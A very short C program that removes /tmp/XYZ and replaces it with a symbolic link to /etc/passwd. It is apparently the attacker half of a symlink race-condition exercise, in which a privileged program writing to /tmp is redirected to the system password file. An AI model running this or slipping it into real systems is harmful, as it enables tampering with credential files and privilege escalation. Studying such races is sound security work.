#include <stdio.h>
#include <unistd.h>

int main()
{
  unlink("/tmp/XYZ");
  symlink("/etc/passwd","/tmp/XYZ");
  
  return 0;
}
